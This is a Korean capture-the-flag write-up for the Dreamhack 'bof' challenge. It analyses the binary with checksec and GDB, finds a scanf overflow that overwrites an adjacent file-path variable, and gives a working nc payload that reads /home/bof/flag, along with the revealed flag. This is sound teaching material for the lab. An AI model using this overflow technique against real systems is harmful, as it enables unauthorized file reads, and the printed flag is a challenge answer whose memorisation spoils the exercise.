# Dreamhack - bof

## 1. 문제 정보

- **문제 정보:** https://dreamhack.io/wargame/challenges/1111
- **분야:** Pwnable
- **핵심 개념:** Buffer Overflow

### 문제 설명

Buffer overflow is one of the basics of pwnable.

버퍼 오버플로우를 이용하여 지정된 플래그 파일을 읽는 문제이다.

플래그 파일의 경로는 다음과 같다.

```text
/home/bof/flag
```

## 2. 문제 파일 확인

<img width="800" alt="Image" src="https://github.com/user-attachments/assets/16b268cc-8955-464f-a040-23810f4a3794" />

다운로드한 문제 파일을 `261025` 폴더에 압축 해제하였다.

```bash
cd ~/261025
ls -al
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/0ab7e13c-818d-4544-961c-ce17a0c76ef9" />


### 2-1. Dockerfile 분석

먼저 Dockerfile을 확인하였다.

```bash
cat Dockerfile
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/e6cc4915-bdff-45de-a1ea-784129b836b0" />

`ENV user bof`는 문제 실행에 사용할 사용자 이름을 `bof`로 설정한다.

`ADD` 명령어를 통해 실행 파일, 플래그 파일, `cat` 파일을 컨테이너 내부의 `/home/bof/` 경로로 복사한다.

```text
/home/bof/bof
/home/bof/cat
/home/bof/flag
```

실행 파일 `bof`에는 `755`, `cat`과 `flag`에는 `440` 권한을 부여한다. `440`은 파일 소유자와 그룹에 읽기 권한만 부여한다는 의미이다.

마지막으로 `socat`을 이용하여 외부 TCP 연결을 `bof` 프로그램의 실행과 연결한다.

이 내용을 통해 실제 플래그 파일이 컨테이너 내부의 `/home/bof/flag`에 있다는 사실을 확인하였다.

## 3. 파일 종류 및 보호 기법 확인

### 3-1. 파일 종류 확인

`deploy` 폴더로 이동한 뒤 파일의 종류를 확인하였다.

```bash
cd ~/261025/deploy
file ./bof ./cat ./flag
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/545adb8a-d88c-44bb-a134-dab64281f421" />

실행 결과:

```text
./bof:  ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
./cat:  ASCII text
./flag: ASCII text
```

`bof`는 64비트 리눅스 ELF 실행 파일이다. `not stripped` 상태이므로 함수 이름 등의 심볼 정보를 활용해 분석할 수 있다.

반면 `cat`과 `flag`는 ASCII 텍스트 파일이다.

`cat` 파일의 내용도 확인하였다.

```bash
cat ./cat
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/1a97c403-087e-4fe1-a521-aa7472fb6059" />

실행 결과:

`cat` 파일에는 고양이 그림이 저장되어 있다. 따라서 프로그램이 이 파일을 읽으면 해당 문자열이 출력될 것으로 예상할 수 있다.

### 3-2. 보호 기법 확인

실행 파일의 보안 보호 기법을 확인하기 위해 `checksec`을 사용하였다.

```bash
checksec --file=./bof
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/86fe6fe5-be9e-44af-a4c7-e4a817b702e0" />

실행 결과:

주요 항목은 다음과 같다.

| 항목 | 결과 | 의미 |
|---|---|---|
| Stack Canary | No canary found | 스택 카나리가 확인되지 않음 |
| NX | Enabled | 스택 등의 메모리에서 코드 직접 실행을 제한 |
| PIE | No PIE | PIE가 적용되지 않음 |
| Stripped | No | 심볼 정보가 제거되지 않음 |


## 4. GDB를 이용한 함수 분석

### 4-1. 함수 목록 확인

GDB를 실행하였다.

```bash
gdb ./bof
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/dc66e6bb-e0fb-4a49-89d6-4e294061cc94" />


함수 목록을 확인하기 위해 다음 명령어를 입력하였다.

```gdb
info functions
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/b08a508d-4428-4459-9677-05b3412dc46c" />

주요 함수는 다음과 같다.

```text
0x0000000000401236  read_cat
0x000000000040132c  init
0x0000000000401391  main
```

`main`은 프로그램의 주요 실행 흐름을 담당하고, `read_cat`은 파일을 읽는 과정을 담당하는 함수로 판단하였다.

따라서 두 함수를 중심으로 어셈블리 코드를 분석하였다.

### 4-2. main 함수 분석

```gdb
disassemble main
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/15bf2654-2334-4357-af37-39250df57052" />

주요 어셈블리 코드는 다음과 같다.

```asm
0x401399 <+8>:   sub    rsp,0x90

0x4013aa <+25>:  lea    rax,[rbp-0x10]
0x4013ae <+29>:  mov    DWORD PTR [rax],0x61632f2e
0x4013b4 <+35>:  mov    WORD PTR [rax+0x4],0x74

0x4013ce <+61>:  lea    rax,[rbp-0x90]
0x4013e7 <+86>:  call   __isoc99_scanf@plt

0x4013ec <+91>:  lea    rax,[rbp-0x10]
0x4013f3 <+98>:  call   read_cat
```

입력 버퍼 시작 주소: rbp-0x90
파일 경로 변수 시작 주소: rbp-0x10

두 주소의 차이는 다음과 같다.

0x90 - 0x10 = 0x80 = 128바이트

파일 경로 변수에는 처음에 ./cat이 저장된다. 이후 사용자 입력을 받는 scanf()가 호출된다.

#### 1) 파일 경로 초기화

```asm
lea rax,[rbp-0x10]
mov DWORD PTR [rax],0x61632f2e
mov WORD PTR [rax+0x4],0x74
```

먼저 `rbp-0x10` 주소에 파일 경로를 저장한다.

리틀 엔디안 방식으로 각 바이트를 해석하면 다음과 같다.

| 바이트 | 문자 |
|---|---|
| `0x2e` | `.` |
| `0x2f` | `/` |
| `0x63` | `c` |
| `0x61` | `a` |
| `0x74` | `t` |
| `0x00` | 문자열 종료 문자 |

따라서 파일 경로 변수에는 `./cat`이 저장된다.

#### 2) 사용자 입력 버퍼 확인

```asm
lea rax,[rbp-0x90]
mov rsi,rax
...
call __isoc99_scanf@plt
```

사용자 입력을 저장하는 버퍼의 시작 주소는 `rbp-0x90`이다.

반면 파일 경로 변수의 시작 주소는 `rbp-0x10`이다.

두 주소의 차이는 다음과 같다.

```text
0x90 - 0x10 = 0x80 = 128
```

따라서 입력 버퍼의 시작 주소와 파일 경로 변수의 시작 주소 사이에는 128바이트의 간격이 있다.

#### 3) 입력 길이 제한 확인

입력 형식 문자열의 주소를 확인하기 위해 다음 명령어를 사용하였다.

```gdb
x/s 0x402034
```
<img width="500" alt="Image" src="https://github.com/user-attachments/assets/c954d26e-5c87-4ee3-bbf3-39f8f2e7fb2f" />

실행 결과:

```text
0x402034: "%144s"
```

`%144s`는 공백 문자가 나오기 전까지 최대 144개의 문자를 입력받는 형식이다. 입력받은 문자열 뒤에는 널 종료 문자도 기록된다.

문제는 입력 버퍼의 크기에 해당하는 공간이 128바이트인데, 최대 144개의 문자를 입력받도록 설정되어 있다는 점이다.

따라서 입력 데이터가 버퍼의 범위를 넘어 인접한 파일 경로 변수까지 덮어쓸 수 있다.

### 4-3. read_cat 함수 분석

```gdb
disassemble read_cat
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/1ae480f4-56fa-46ef-bbc5-1082686ba3c0" />
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/817a2ebd-7ed1-4f54-83d1-62e750429c1f" />
주요 어셈블리 코드는 다음과 같다.

#### 1) 전달받은 경로 저장

```asm
mov QWORD PTR [rbp-0x98],rdi
```

`read_cat`은 첫 번째 인자로 전달받은 포인터를 자신의 스택에 저장한다.

`main`에서 전달한 인자는 파일 경로 변수의 주소이다.

#### 2) 버퍼 초기화

```asm
lea rax,[rbp-0x90]
mov edx,0x80
mov esi,0x0
mov rdi,rax
call memset@plt
```

`memset()`은 지정된 메모리 영역을 특정 값으로 채우는 함수이다.

위 코드는 파일 내용을 저장할 버퍼의 128바이트를 0으로 초기화한다.

#### 3) 파일 열기

```asm
mov rax,QWORD PTR [rbp-0x98]
mov esi,0x0
mov rdi,rax
call open@plt
```

`open()`을 호출하여 전달받은 경로의 파일을 읽기 전용으로 연다.

파일 열기에 성공하면 파일 디스크립터를 반환하고, 실패하면 `-1`을 반환한다.

#### 4) 파일 내용 읽기

```asm
lea rcx,[rbp-0x90]
mov eax,DWORD PTR [rbp-0x4]
mov edx,0x80
mov rsi,rcx
mov edi,eax
call read@plt
```

`read()`를 이용하여 열린 파일에서 최대 128바이트를 읽어 버퍼에 저장한다.

#### 5) 파일 내용 출력

```asm
lea rax,[rbp-0x90]
mov rdi,rax
call puts@plt
```

마지막으로 버퍼에 저장된 문자열을 출력한다.

따라서 `read_cat()`은 전달받은 파일 경로를 이용해 파일을 열고, 내용을 읽어 출력하는 함수이다.

## 5. 취약점 원인

분석 결과, 취약점의 원인은 사용자 입력 길이와 입력 버퍼의 크기가 일치하지 않는 데 있다.

```text
입력 버퍼 시작 주소: rbp-0x90
파일 경로 변수 주소: rbp-0x10
주소 사이의 간격: 128바이트
scanf 입력 제한: 최대 144문자
```

입력 버퍼보다 긴 문자열을 입력하면 버퍼를 넘어 인접한 메모리 영역에 데이터가 기록될 수 있다.

이번 문제에서는 그 영역에 파일 경로 변수가 존재한다.

원래 파일 경로는 다음과 같다.

```text
./cat
```

입력 버퍼를 128바이트 채운 다음 다른 파일 경로를 입력하면, 파일 경로 변수를 덮어쓸 수 있다.

이후 `main()`은 해당 변수를 `read_cat()`에 전달하고, `read_cat()`은 전달받은 경로의 파일을 열어 내용을 읽는다.

### 공격 흐름

```text
main() 실행
    ↓
파일 경로 변수에 "./cat" 저장
    ↓
scanf("%144s", ...)로 사용자 입력
    ↓
128바이트 입력 버퍼의 범위를 넘어 데이터 기록
    ↓
파일 경로 변수 덮어쓰기
    ↓
read_cat()에 변경된 경로 전달
    ↓
open()으로 파일 열기
    ↓
read()로 파일 내용 읽기
    ↓
puts()로 파일 내용 출력
```

## 6. 원격 서버에서 플래그 획득

Dreamhack 문제 페이지에서 VM을 실행한 뒤 접속 정보를 확인하였다.

```text
Host: host3.dreamhack.games
Port: 19343
Container Port: 31337
```

외부 접속 포트인 `19343`을 사용하여 원격 서버에 입력을 전달하였다.

### 원격 페이로드

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"/home/bof/flag\n")' | nc host3.dreamhack.games 19343
```
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/743af7c3-0f2a-41db-8e81-302d36ccac2b" />

드림핵 문제에서 안내한 절대 경로인 `/home/bof/flag`를 사용하였다.

앞의 128바이트로 입력 버퍼를 채우고, 이어지는 경로 문자열로 파일 경로 변수를 덮어쓰도록 구성하였다.

### 실행 결과

```text
meow?
DH{5cd1f793ae6a081e4bfd28f6d570d83355148245fbe7c1f69b12771202b80a13}

meow, AAAAAAAA.../home/bof/flag :)
```

원격 서버에서 실제 플래그가 출력되는 것을 확인하였다.

### 획득한 플래그

```text
DH{5cd1f793ae6a081e4bfd28f6d570d83355148245fbe7c1f69b12771202b80a13}
```

## 8. 결론 및 배운 점

이번 문제에서는 GDB를 이용하여 64비트 ELF 실행 파일의 메모리 구조와 함수 호출 과정을 분석하고, 버퍼 오버플로우 취약점을 이용해 파일 경로를 변경하였다.

`main()`의 어셈블리를 통해 입력 버퍼의 시작 주소가 `rbp-0x90`, 파일 경로 변수의 시작 주소가 `rbp-0x10`임을 확인하였다. 두 주소 사이에는 128바이트의 간격이 있었으며, `scanf("%144s", ...)`는 버퍼 크기보다 긴 입력을 허용하고 있었다.

또한 `read_cat()`을 분석하여 전달받은 경로를 `open()`에 전달하고, 파일 내용을 `read()`로 읽은 뒤 `puts()`로 출력한다는 사실을 확인하였다.

이를 바탕으로 로컬에서 먼저 취약점을 검증하고, 원격 서버에서 `/home/bof/flag`를 읽도록 하여 실제 플래그를 획득하였다.

이번 문제를 통해 버퍼 오버플로우는 반환 주소를 덮어쓰는 공격뿐만 아니라, 인접한 변수의 값을 변경하여 프로그램의 동작에 영향을 주는 데도 활용될 수 있다는 점을 배웠다.

또한 소스코드가 제공되지 않는 상황에서도 `file`, `checksec`, `gdb`, `disassemble`, `x/s` 등의 도구를 이용해 실행 파일의 구조와 동작을 분석하는 과정을 경험하였다.